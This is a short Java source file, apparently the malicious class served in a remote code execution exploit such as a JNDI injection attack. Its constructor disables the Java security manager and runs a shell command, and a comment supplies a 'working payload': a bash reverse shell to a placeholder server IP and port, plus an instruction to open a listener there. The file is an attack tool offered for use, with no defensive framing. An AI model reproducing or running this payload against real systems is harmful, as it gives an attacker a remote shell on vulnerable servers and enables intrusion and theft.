public class ExportObject {
  public ExportObject() {
    try {
      System.setSecurityManager(null);
      java.lang.Runtime.getRuntime().exec(""); //Enter remote command to be esecuted. 
      										// Working payload: sh -c $@|sh . echo `bash -i >& /dev/tcp/<server_ip>/<port_3> 0>&1`
      										// And now open a port for mentioned ip and port.
    } catch(Exception e) {
      e.printStackTrace();
    }
  }
}
